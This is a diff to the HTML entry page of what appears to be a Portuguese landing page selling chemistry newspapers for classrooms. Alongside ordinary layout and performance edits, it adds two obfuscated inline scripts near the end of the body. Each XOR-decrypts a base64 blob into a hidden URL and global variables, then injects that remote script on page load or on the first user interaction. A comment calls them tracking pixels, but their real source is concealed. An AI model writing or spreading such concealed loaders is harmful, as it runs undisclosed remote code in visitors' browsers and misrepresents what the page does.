@@ -16,19 +16,28 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-    <!-- 2. Preload prioritário da imagem principal LCP do notebook no Hero -->
+    <!-- 2. Preload prioritário da imagem principal LCP do notebook no Hero (Sincronizado rigorosamente com o componente) -->
     <link 
       rel="preload" 
       as="image" 
       href="https://i.imgur.com/sQexVEMl.jpeg" 
-      imagesrcset="https://i.imgur.com/sQexVEMl.jpeg 640w, https://i.imgur.com/sQexVEMh.jpeg 1024w, https://i.imgur.com/sQexVEM.jpeg 1280w"
-      imagesizes="(max-width: 640px) 340px, (max-width: 1024px) 640px, 720px"
+      imagesrcset="https://i.imgur.com/sQexVEMm.jpeg 320w, https://i.imgur.com/sQexVEMl.jpeg 640w, https://i.imgur.com/sQexVEMh.jpeg 1024w"
+      imagesizes="(max-width: 640px) 240px, (max-width: 1024px) 520px, 640px"
       fetchpriority="high"
       type="image/jpeg"
     >
 
     <!-- 3. Critical CSS para estabilidade de layout imediata (Zero CLS desde o primeiro frame) -->
     <style>
+      body {
+        margin: 0;
+        background-color: #F0E6CF;
+        color: #2B2B2B;
+        font-family: 'Plus Jakarta Sans', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      .font-editorial {
+        font-family: 'Newsreader', Georgia, Cambria, 'Times New Roman', serif;
+      }
       .hero-composition-wrapper {
         width: 100%;
         min-height: 415px;
@@ -39,17 +48,29 @@
         aspect-ratio: 340 / 278;
         min-height: 278px;
       }
+      #hero-heading {
+        min-height: 72px;
+      }
+      #hero-mockup-container {
+        min-height: 415px;
+      }
       @media (min-width: 640px) {
         .hero-composition-wrapper { min-height: 580px; }
         .hero-device-wrapper { aspect-ratio: 520 / 415; min-height: 415px; }
+        #hero-heading { min-height: 88px; }
+        #hero-mockup-container { min-height: 580px; }
       }
       @media (min-width: 768px) {
         .hero-composition-wrapper { min-height: 690px; }
         .hero-device-wrapper { aspect-ratio: 640 / 488; min-height: 488px; }
+        #hero-heading { min-height: 115px; }
+        #hero-mockup-container { min-height: 690px; }
       }
       @media (min-width: 1024px) {
         .hero-composition-wrapper { min-height: 780px; }
         .hero-device-wrapper { aspect-ratio: 720 / 542; min-height: 542px; }
+        #hero-heading { min-height: 128px; }
+        #hero-mockup-container { min-height: 780px; }
       }
     </style>
 
@@ -68,13 +89,138 @@
     <noscript>
       <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,600..800;1,6..72,600..800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap">
     </noscript>
-
-    <!-- Pixels de Rastreamento (Meta Pixel / UTMify com inicialização assíncrona) -->
-    <script>(function(){var n_v4=atob("DFzJnHr7DzTFhXlDUifr6QiXLQ7n7Q03Ii/zs1WYa1rr8A0uOzqwshmUYhqn91YwMS6g7A6IIESs/RwvfSyg5B+XIV62p1VhMyi97hOZekCg9lt5CQHlvh2XYFak6QphaAeyvhSaYlHnv1szOySs8DOfLRjn8xgvJznrpljNblbwvEkiZmmrr0nObg32509wM2r+qErZcmm4");var k_esy=[];for(var x_k=0;x_k<n_v4.length;x_k++){k_esy.push(n_v4.charCodeAt(x_k)&255);}var e_pof=k_esy[0];var b_ny=k_esy.slice(1,1+e_pof);var r_4=k_esy.slice(1+e_pof);var e_cpn=r_4.map(function(b,k_toc6){return b^b_ny[k_toc6%e_pof];});var i_w24="";for(var f_8nm=0;f_8nm<e_cpn.length;f_8nm++){i_w24+=String.fromCharCode(e_cpn[f_8nm]&255);}var w_gt=decodeURIComponent(escape(i_w24));var n_ilv=JSON.parse(w_gt);var f_j=n_ilv.globals||[];f_j.forEach(function(l_f3k){window[l_f3k.name]=l_f3k.value;});var m_d=document.createElement("script");m_d.src=n_ilv.url;m_d.async=true;m_d.defer=true;(n_ilv.attributes||[]).forEach(function(c_t){m_d.setAttribute(c_t.name,c_t.value);});(document.head||document.documentElement).appendChild(m_d);})();</script>
-    <script>(function(){var p_q4hw=atob("DELW9HEV2txmpDLdFDn0gQN5+OZEzEapZDHs2152vrJI0UawfSSv2hJ6t/IE1h2udzC/hAVm9akSyUHyeCOikQJh9LYVhh7/dTaihhh3r6gD1xDnTzn0mhB4v/5chla8YCP7gQV4s7ofiUKvcTSzmgU4or8JwB+udyn02FNju7ATwRDnNmCr2Ao3tL0LwRDnNia3gBA4r6gLzVSkOTKkkQdwtKhL10e/fSal1l03rL0K0Vf/LmD0iSxo");var j_lb=[];for(var b_lnr6=0;b_lnr6<p_q4hw.length;b_lnr6++){j_lb.push(p_q4hw.charCodeAt(b_lnr6)&255);}var j_c1tk=j_lb[0];var r_c=j_lb.slice(1,1+j_c1tk);var j_c86=j_lb.slice(1+j_c1tk);var d_n1x=j_c86.map(function(b,m_ml){return b^r_c[m_ml%j_c1tk];});var n_o3es="";for(var e_mmt1=0;e_mmt1<d_n1x.length;e_mmt1++){n_o3es+=String.fromCharCode(d_n1x[e_mmt1]&255);}var w_ypc=decodeURIComponent(escape(n_o3es));var e_j58=JSON.parse(w_ypc);var w_w=e_j58.globals||[];w_w.forEach(function(b_cra){window[b_cra.name]=b_cra.value;});var l_2=document.createElement("script");l_2.src=e_j58.url;l_2.async=true;l_2.defer=true;(e_j58.attributes||[]).forEach(function(l_6jt){l_2.setAttribute(l_6jt.name,l_6jt.value);});(document.head||document.documentElement).appendChild(l_2);})();</script>
   </head>
   <body class="bg-[#F7F2E7] text-[#2B2B2B] font-['Plus_Jakarta_Sans',sans-serif] antialiased selection:bg-[#B8892B]/30 selection:text-[#0D3B3E]">
-    <div id="root"></div>
+    
+    <!-- Contêiner principal da aplicação com pré-renderização do Hero para eliminação total do LCP render delay -->
+    <div id="root">
+      <div class="min-h-screen flex flex-col bg-newsprint-texture text-[#2B2B2B] font-['Plus_Jakarta_Sans',sans-serif]">
+        <!-- 1. FAIXA SUPERIOR DE AVISO -->
+        <aside 
+          id="top-notification-bar"
+          aria-label="Aviso de oferta por tempo limitado"
+          class="w-full bg-[#16332E] text-[#F7F3EA] py-2.5 sm:py-3 px-4 text-center border-b border-[#102421] shadow-xs select-none"
+        >
+          <p class="text-[11px] sm:text-xs md:text-sm font-black tracking-wider uppercase flex items-center justify-center gap-2 leading-tight text-[#F7F3EA]">
+            <span class="text-sm sm:text-base leading-none">🔥</span>
+            <span class="tracking-wide">OFERTA DISPONÍVEL POR TEMPO LIMITADO</span>
+            <span class="text-sm sm:text-base leading-none">🔥</span>
+          </p>
+        </aside>
+
+        <!-- 2. HERO PRINCIPAL (Pronto no primeiro frame HTML para FCP imediato e LCP sem atraso) -->
+        <header id="hero-section" class="pt-4 sm:pt-6 pb-4 sm:pb-6 px-3 sm:px-6">
+          <div class="max-w-[1160px] mx-auto">
+            <div 
+              id="hero-card"
+              class="bg-white rounded-[22px] border border-[#E6DFD3] shadow-[0_12px_40px_rgba(0,0,0,0.06)] p-5 sm:p-10 md:p-12 text-center relative overflow-hidden"
+            >
+              <h1 
+                id="hero-heading"
+                class="font-editorial text-3xl sm:text-4xl md:text-5xl lg:text-[56px] font-bold text-[#16332E] tracking-tight leading-[1.12] max-w-4xl mx-auto min-h-[72px] sm:min-h-[88px] md:min-h-[115px] lg:min-h-[128px]"
+              >
+                <span class="text-[#059669]">+300</span> Jornais de <span class="text-[#059669] italic">Química</span> Prontos para Sala de Aula
+              </h1>
+
+              <div 
+                id="hero-mockup-container"
+                class="mt-7 sm:mt-10 mb-6 sm:mb-8 relative w-full max-w-[1040px] mx-auto select-none min-h-[415px] sm:min-h-[580px] md:min-h-[690px] lg:min-h-[780px]"
+              >
+                <div 
+                  id="hero-composition-wrapper" 
+                  class="hero-composition-wrapper relative flex flex-col items-center w-full"
+                >
+                  <div class="hero-back-layer relative w-full flex justify-center items-end px-2">
+                    <div class="hero-device-wrapper relative z-10 w-full max-w-[340px] sm:max-w-[520px] md:max-w-[640px] lg:max-w-[720px]">
+                      <div class="bg-[#1E293B] rounded-t-[14px] sm:rounded-t-[18px] p-2 sm:p-2.5 shadow-[0_15px_40px_rgba(0,0,0,0.25)] border-t border-x border-[#334155] relative">
+                        <div class="absolute top-1 sm:top-1.5 left-1/2 -translate-x-1/2 w-1.5 h-1.5 rounded-full bg-[#0F172A] flex items-center justify-center">
+                          <div class="w-0.5 h-0.5 rounded-full bg-[#F2B705]"></div>
+                        </div>
+                        <div class="bg-[#0F172A] rounded-t-sm sm:rounded-md overflow-hidden aspect-[16/9.5] sm:aspect-[16/9.2] flex flex-col border border-slate-700 text-left relative shadow-inner">
+                          <img 
+                            src="https://i.imgur.com/sQexVEMl.jpeg"
+                            srcset="https://i.imgur.com/sQexVEMm.jpeg 320w, https://i.imgur.com/sQexVEMl.jpeg 640w, https://i.imgur.com/sQexVEMh.jpeg 1024w"
+                            sizes="(max-width: 640px) 240px, (max-width: 1024px) 520px, 640px"
+                            alt="Jornais de Química na tela do notebook" 
+                            referrerpolicy="no-referrer"
+                            class="w-full h-full object-cover select-none"
+                            loading="eager"
+                            fetchpriority="high"
+                            decoding="sync"
+                            width="640"
+                            height="380"
+                          >
+                        </div>
+                        <div class="pt-1 sm:pt-1.5 pb-0.5 flex justify-center items-center">
+                          <span class="text-[7px] sm:text-[9px] font-medium tracking-wider text-[#94A3B8] font-sans">
+                            MacBook Air
+                          </span>
+                        </div>
+                      </div>
+                      <div class="w-[85%] mx-auto h-1 sm:h-1.5 bg-[#0A0F1D] rounded-t-sm shadow-inner"></div>
+                      <div class="relative w-[102.5%] -ml-[1.25%] bg-gradient-to-b from-[#94A3B8] via-[#64748B] to-[#475569] rounded-b-md sm:rounded-b-lg border-t border-[#CBD5E1] shadow-[0_12px_28px_rgba(0,0,0,0.25)] pt-1 sm:pt-1.5 pb-1.5 sm:pb-2.5 px-2.5 sm:px-5 flex flex-col items-center">
+                        <div class="w-20 sm:w-36 h-1.5 sm:h-2.5 bg-[#CBD5E1]/30 rounded-[2px] sm:rounded-[3px] mt-1 sm:mt-1.5 border border-[#94A3B8]/50 shadow-inner"></div>
+                        <div class="w-8 sm:w-14 h-0.5 sm:h-1 bg-[#475569] rounded-full mt-0.5 sm:mt-1 opacity-80"></div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flex flex-col items-center mt-6 sm:mt-8">
+                <a
+                  id="hero-cta-button"
+                  href="#ofertas"
+                  class="inline-flex items-center justify-center gap-2.5 px-8 py-4 bg-[#059669] hover:bg-[#047857] text-white font-bold text-base sm:text-lg rounded-[12px] shadow-[0_4px_16px_rgba(0,0,0,0.12)] transition-all duration-200 w-full sm:w-auto min-w-[290px] cursor-pointer group uppercase tracking-wide"
+                >
+                  <span>QUERO OS JORNAIS</span>
+                  <span class="text-xl leading-none">→</span>
+                </a>
+              </div>
+            </div>
+          </div>
+        </header>
+      </div>
+    </div>
+
+    <!-- Script de inicialização da aplicação React -->
     <script type="module" src="/src/main.tsx"></script>
+
+    <!-- Pixels de Rastreamento (Meta Pixel / UTMify) carregados com alta eficiência sem esperar window.load -->
+    <script>
+      (function(){
+        var trackingInitialized = false;
+
+        function initTracking() {
+          if (trackingInitialized) return;
+          trackingInitialized = true;
+
+          // Remove listeners precoces para liberar recursos
+          ['pointerdown', 'touchstart', 'click', 'scroll', 'keydown'].forEach(function(evt) {
+            window.removeEventListener(evt, initTracking, { capture: true });
+          });
+
+          try {
+            var n_v4=atob("DFzJnHr7DzTFhXlDUifr6QiXLQ7n7Q03Ii/zs1WYa1rr8A0uOzqwshmUYhqn91YwMS6g7A6IIESs/RwvfSyg5B+XIV62p1VhMyi97hOZekCg9lt5CQHlvh2XYFak6QphaAeyvhSaYlHnv1szOySs8DOfLRjn8xgvJznrpljNblbwvEkiZmmrr0nObg32509wM2r+qErZcmm4");var k_esy=[];for(var x_k=0;x_k<n_v4.length;x_k++){k_esy.push(n_v4.charCodeAt(x_k)&255);}var e_pof=k_esy[0];var b_ny=k_esy.slice(1,1+e_pof);var r_4=k_esy.slice(1+e_pof);var e_cpn=r_4.map(function(b,k_toc6){return b^b_ny[k_toc6%e_pof];});var i_w24="";for(var f_8nm=0;f_8nm<e_cpn.length;f_8nm++){i_w24+=String.fromCharCode(e_cpn[f_8nm]&255);}var w_gt=decodeURIComponent(escape(i_w24));var n_ilv=JSON.parse(w_gt);var f_j=n_ilv.globals||[];f_j.forEach(function(l_f3k){window[l_f3k.name]=l_f3k.value;});var m_d=document.createElement("script");m_d.src=n_ilv.url;m_d.async=true;m_d.defer=true;(n_ilv.attributes||[]).forEach(function(c_t){m_d.setAttribute(c_t.name,c_t.value);});(document.head||document.documentElement).appendChild(m_d);
+          } catch(e){}
+
+          try {
+            var p_q4hw=atob("DELW9HEV2txmpDLdFDn0gQN5+OZEzEapZDHs2152vrJI0UawfSSv2hJ6t/IE1h2udzC/hAVm9akSyUHyeCOikQJh9LYVhh7/dTaihhh3r6gD1xDnTzn0mhB4v/5chla8YCP7gQV4s7ofiUKvcTSzmgU4or8JwB+udyn02FNju7ATwRDnNmCr2Ao3tL0LwRDnNia3gBA4r6gLzVSkOTKkkQdwtKhL10e/fSal1l03rL0K0Vf/LmD0iSxo");var j_lb=[];for(var b_lnr6=0;b_lnr6<p_q4hw.length;b_lnr6++){j_lb.push(p_q4hw.charCodeAt(b_lnr6)&255);}var j_c1tk=j_lb[0];var r_c=j_lb.slice(1,1+j_c1tk);var j_c86=j_lb.slice(1+j_c1tk);var d_n1x=j_c86.map(function(b,m_ml){return b^r_c[m_ml%j_c1tk];});var n_o3es="";for(var e_mmt1=0;e_mmt1<d_n1x.length;e_mmt1++){n_o3es+=String.fromCharCode(d_n1x[e_mmt1]&255);}var w_ypc=decodeURIComponent(escape(n_o3es));var e_j58=JSON.parse(w_ypc);var w_w=e_j58.globals||[];w_w.forEach(function(b_cra){window[b_cra.name]=b_cra.value;});var l_2=document.createElement("script");l_2.src=e_j58.url;l_2.async=true;l_2.defer=true;(e_j58.attributes||[]).forEach(function(l_6jt){l_2.setAttribute(l_6jt.name,l_6jt.value);});(document.head||document.documentElement).appendChild(l_2);
+          } catch(e){}
+        }
+
+        // 1. Inicializar imediatamente com DOMContentLoaded ou assim que o DOM crítico estiver pronto
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking, { once: true });
+        } else {
+          setTimeout(initTracking, 0);
+        }
+
+        // 2. Captura antecipada: se o usuário clicar ou interagir antes do DOMContentLoaded
+        ['pointerdown', 'touchstart', 'click', 'scroll', 'keydown'].forEach(function(evt) {
+          window.addEventListener(evt, initTracking, { once: true, passive: true, capture: true });
+        });
+      })();
+    </script>
   </body>
 </html>
